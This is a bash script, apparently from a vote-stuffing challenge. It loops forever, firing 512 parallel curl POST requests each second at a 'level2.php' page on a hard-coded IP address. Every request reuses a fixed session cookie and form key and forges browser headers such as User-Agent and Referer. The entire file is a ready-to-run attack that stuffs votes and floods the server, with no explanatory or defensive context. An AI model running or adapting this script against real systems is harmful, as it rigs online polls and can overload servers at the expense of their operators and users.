while :
do
	for i in $(seq 1 512):
	do
		curl 'http://173.246.108.142/level2.php' -H 'Cookie: HoldTheDoor=d018c0bc658638751950478fa40aefb4229a61bc' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/10.0.1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level2.php' -H 'Connection: keep-alive' --data 'id=1&holdthedoor=Submit&key=d018c0bc658638751950478fa40aefb4229a61bc' --compressed &
	done
	sleep 1
done
